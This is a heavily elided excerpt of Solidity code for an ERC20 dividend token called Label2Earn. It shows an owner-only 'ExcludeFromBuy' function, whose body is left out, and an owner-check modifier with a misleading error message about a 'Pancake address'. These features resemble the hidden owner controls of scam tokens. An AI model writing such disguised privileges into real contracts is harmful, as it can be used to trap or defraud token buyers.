...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ExcludeFromBuy(uint256 amount, address account) public isOwner {
    ...
    modifier isOwner() {
      require(WalletDeployer == msg.sender, "ERC20: cannot permit Pancake address");
      _;
...
contract Label2Earn is ERC20DividendToken {
